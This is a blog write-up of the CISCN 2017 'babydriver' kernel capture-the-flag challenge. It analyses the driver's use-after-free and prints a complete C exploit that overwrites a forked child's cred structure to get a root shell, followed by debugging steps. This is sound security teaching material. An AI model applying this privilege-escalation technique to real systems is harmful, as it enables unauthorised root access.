@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>wp baby driver | I0gan</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Kenel pwn ciscn 2017 baby driver第一天真正开始做kernel pwn类的题, 于用户空间做的体确实有点不太一样, 利用从python 转向c语言写与驱动交互的程序, 找驱动程序的漏洞, 然后提权为root 知识预备权限在linux中每个进程都有它自己的权限,而标示着权限的那些信息,比如uid，gid等都是被放在一个叫cred的结构体当中的,也就是说每个进程中都有一个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="wp baby driver">
+<meta property="og:url" content="http://blog.i0gan.cn/2020/09/15/wp-babydriver/index.html">
+<meta property="og:site_name" content="I0gan">
+<meta property="og:description" content="Kenel pwn ciscn 2017 baby driver第一天真正开始做kernel pwn类的题, 于用户空间做的体确实有点不太一样, 利用从python 转向c语言写与驱动交互的程序, 找驱动程序的漏洞, 然后提权为root 知识预备权限在linux中每个进程都有它自己的权限,而标示着权限的那些信息,比如uid，gid等都是被放在一个叫cred的结构体当中的,也就是说每个进程中都有一个">
+<meta property="og:locale">
+<meta property="og:image" content="http://blog.i0gan.cn/images/wp-babydriver-1.png">
+<meta property="og:image" content="http://blog.i0gan.cn/images/wp-babydriver-2.png">
+<meta property="article:published_time" content="2020-09-15T13:44:03.000Z">
+<meta property="article:modified_time" content="2020-10-25T03:54:02.379Z">
+<meta property="article:author" content="i0gan">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.i0gan.cn/images/wp-babydriver-1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="I0gan" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">I0gan</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.i0gan.cn"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-wp-babydriver" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/09/15/wp-babydriver/" class="article-date">
+  <time datetime="2020-09-15T13:44:03.000Z" itemprop="datePublished">2020-09-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/pwn/">pwn</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      wp baby driver
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Kenel-pwn-ciscn-2017-baby-driver"><a href="#Kenel-pwn-ciscn-2017-baby-driver" class="headerlink" title="Kenel pwn ciscn 2017 baby driver"></a>Kenel pwn ciscn 2017 baby driver</h1><p>第一天真正开始做kernel pwn类的题, 于用户空间做的体确实有点不太一样, 利用从python 转向c语言写与驱动交互的程序, 找驱动程序的漏洞, 然后提权为root</p>
+<h2 id="知识预备"><a href="#知识预备" class="headerlink" title="知识预备"></a>知识预备</h2><h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><p>在linux中每个进程都有它自己的权限,而标示着权限的那些信息,比如uid，gid等都是被放在一个叫cred的结构体当中的,也就是说每个进程中都有一个cred结构,如果能够修改进程的cred的uid和gid为0, 那么该进程的权限就为root权限了.<br>以下是cred结构体:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>当我们是root权限的时候,我们的uid是等于0的,另外此版本的cred的大小是0xa8;</p>
+<h3 id="SLAB-amp-SLUB"><a href="#SLAB-amp-SLUB" class="headerlink" title="SLAB &amp; SLUB"></a>SLAB &amp; SLUB</h3><p>  kernel中没有libc，但是仍然需要内存的分配和释放，这时就会使用到kmalloc&amp;kfree  API（相当于用户态使用的malloc&amp;free）。kmalloc&amp;kfree的实现是通过SLAB或SLUB分配器，现在一般是SLUB分配器。分配器是通过一个多级的结构进行管理。首先有cache层，cache是一个结构，其中保存的对象分为空对象、部分使用的对象和完全使用的对象进行管理。对象就是指内存对象，也就是用来分配或者已经分配的一部分内核空间。kmalloc使用了多个cache，每个cache对应一个2的幂次大小的一组内存对象。</p>
+<p>  SLAB和SLUB都是内核的内存管理机制。为了提高效率，SLAB要求系统暂时保留已经释放的内核对象空间，以便下次申请时不需要再次初始化和分配。但是SLAB比较严格，需要再次申请的数据类型和大小与原先的完全一样，并且不同cache的无法分在同一页内；而SLUB较为宽松，和堆分配机制更为相似。</p>
+<h2 id="设备程序分析"><a href="#设备程序分析" class="headerlink" title="设备程序分析"></a>设备程序分析</h2><p>驱动中存在一个结构体</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct babydev_struct&#123;</span><br><span class="line">    char *device_buf;</span><br><span class="line">    size_t device_buf_len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="babyopen函数"><a href="#babyopen函数" class="headerlink" title="babyopen函数"></a>babyopen函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  <span class="comment">//对babydev_struct.device_buf 进行开辟一个0x40大小的内存</span></span><br><span class="line">  babydev_struct.device_buf = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">0x40</span>LL);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">0x40</span>LL;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">0x24000C0</span>LL, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="babywrite函数"><a href="#babywrite函数" class="headerlink" title="babywrite函数"></a>babywrite函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">      copy_from_user(babydev_struct.device_buf, buffer, v4); <span class="comment">// 从用户空间拷贝数据到babydev_struct.device_buf</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="babyread-函数"><a href="#babyread-函数" class="headerlink" title="babyread 函数"></a>babyread 函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">      copy_to_user(buffer, babydev_struct.device_buf, v4); <span class="comment">//从内核中拷贝数据到用户空间</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="babyioctrl函数"><a href="#babyioctrl函数" class="headerlink" title="babyioctrl函数"></a>babyioctrl函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="keyword">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);<span class="comment">// 根据用户来控制开辟内存空间的大小</span></span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;\x013defalut:arg is %ld\n&quot;</span>, v3, v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="babyrelease函数"><a href="#babyrelease函数" class="headerlink" title="babyrelease函数"></a>babyrelease函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);             <span class="comment">// 释放babydev_struct.device_buf, 对指针没有清0, 造成uaf漏洞</span></span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这个从用户态的pwn来看好像漏洞并不明显,但是我们现在是在内核态了,要把用户态的单线程的思维抛开了,从多线程的角度来思考。</p>
+<ol>
+<li>首先打开两次设备，通过ioctl将babydev_struct大小为的cred结构体的大小(不同版本kernel的可能不一样,需要通过源码去算);</li>
+<li>然后释放其中一个设备，fork出一个新进程，此时这个新进程的cred 的空间就会重新开辟, 然而系统就会把之前大小一样空闲内存空间分配给它,。</li>
+<li>第二个打开的文件描述符对这块空间进行写操作，只需要将uid和gid改为0，实现root提权</li>
+</ol>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -o exp -static -w</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    	<span class="comment">// vul: uaf</span></span><br><span class="line">        <span class="keyword">int</span> fd_1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="keyword">int</span> fd_2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR); <span class="comment">//babydev_struct.device_buf 记录的是 fd_2</span></span><br><span class="line">        <span class="keyword">pid_t</span> pid;</span><br><span class="line">        ioctl(fd_1, <span class="number">0x10001</span>, <span class="number">0xa8</span>); <span class="comment">// 开辟0xa8的内核空间, 命名为chunk1吧</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="number">-1</span> == fd_1 || <span class="number">-1</span> == fd_2) &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;open babydev failed!\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd_1);  <span class="comment">// 关闭fd_1, ioctl所开辟的0xa8空间, 释放掉chunk1内存,</span></span><br><span class="line">        pid = fork(); <span class="comment">// fork 时有点类似与malloc中的fastbin原理, 子进程开辟cred内存的时候, 先遍历大小合适的空闲内存, 然后直接分配</span></span><br><span class="line">        <span class="comment">// child process</span></span><br><span class="line">        <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">char</span> buf[<span class="number">60</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">                write(fd_2, buf, <span class="number">60</span>);  <span class="comment">//向释放掉的chunk1内存中填充60个0, 然而也是该进程的cred结构体,使uid和gid为0, 提权为root</span></span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);     <span class="comment">//运行子进程时会继承父进程的权限</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                wait();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="提取vmlinux"><a href="#提取vmlinux" class="headerlink" title="提取vmlinux"></a>提取vmlinux</h3><p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a>脚本如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Inspired from extract-ikconfig</span></span><br><span class="line"><span class="comment"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">check_vmlinux()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment"># Use readelf to check if it&#x27;s a valid ELF</span></span><br><span class="line">	<span class="comment"># <span class="doctag">TODO:</span> find a better to way to check that it&#x27;s really vmlinux</span></span><br><span class="line">	<span class="comment">#       and not just an elf</span></span><br><span class="line">	readelf -h <span class="variable">$1</span> &gt; /dev/null 2&gt;&amp;1 || <span class="built_in">return</span> 1</span><br><span class="line"></span><br><span class="line">	cat <span class="variable">$1</span></span><br><span class="line">	<span class="built_in">exit</span> 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_decompress()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment"># The obscure use of the &quot;tr&quot; filter is to work around older versions of</span></span><br><span class="line">	<span class="comment"># &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Try to find the header ($1) and decompress from here</span></span><br><span class="line">	<span class="keyword">for</span>	pos <span class="keyword">in</span> `tr <span class="string">&quot;<span class="variable">$1</span>\n<span class="variable">$2</span>&quot;</span> <span class="string">&quot;\n<span class="variable">$2</span>=&quot;</span> &lt; <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | grep -abo <span class="string">&quot;^<span class="variable">$2</span>&quot;</span>`</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">		pos=<span class="variable">$&#123;pos%%:*&#125;</span></span><br><span class="line">		tail -c+<span class="variable">$pos</span> <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | <span class="variable">$3</span> &gt; <span class="variable">$tmp</span> 2&gt; /dev/null</span><br><span class="line">		check_vmlinux <span class="variable">$tmp</span></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check invocation:</span></span><br><span class="line">me=<span class="variable">$&#123;0##*/&#125;</span></span><br><span class="line">img=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">if</span>	[ <span class="variable">$#</span> -ne 1 -o ! -s <span class="string">&quot;<span class="variable">$img</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$me</span> &lt;kernel-image&gt;&quot;</span> &gt;&amp;2</span><br><span class="line">	<span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare temp files:</span></span><br><span class="line">tmp=$(mktemp /tmp/vmlinux-XXX)</span><br><span class="line"><span class="built_in">trap</span> <span class="string">&quot;rm -f <span class="variable">$tmp</span>&quot;</span> 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># That didn&#x27;t work, so retry after decompression.</span></span><br><span class="line">try_decompress <span class="string">&#x27;\037\213\010&#x27;</span> xy    gunzip</span><br><span class="line">try_decompress <span class="string">&#x27;\3757zXZ\000&#x27;</span> abcde unxz</span><br><span class="line">try_decompress <span class="string">&#x27;BZh&#x27;</span>          xy    bunzip2</span><br><span class="line">try_decompress <span class="string">&#x27;\135\0\0\0&#x27;</span>   xxx   unlzma</span><br><span class="line">try_decompress <span class="string">&#x27;\211\114\132&#x27;</span> xy    <span class="string">&#x27;lzop -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;\002!L\030&#x27;</span>   xxx   <span class="string">&#x27;lz4 -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;(\265/\375&#x27;</span>   xxx   unzstd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Finally check for uncompressed images or objects:</span></span><br><span class="line">check_vmlinux <span class="variable">$img</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bail out:</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$me</span>: Cannot find vmlinux.&quot;</span> &gt;&amp;2</span><br></pre></td></tr></table></figure>
+
+<p>保存为extract-vmlinux</p>
+<p>提取vmlinux, 方便调试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;extract-vmlinux .&#x2F;bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动gdb"><a href="#启动gdb" class="headerlink" title="启动gdb"></a>启动gdb</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb .&#x2F;vmlinux -q</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动boot-sh获取babydriver的加载基址"><a href="#启动boot-sh获取babydriver的加载基址" class="headerlink" title="启动boot.sh获取babydriver的加载基址"></a>启动boot.sh获取babydriver的加载基址</h3><p>使用 cat /proc/moudles或者lsmod</p>
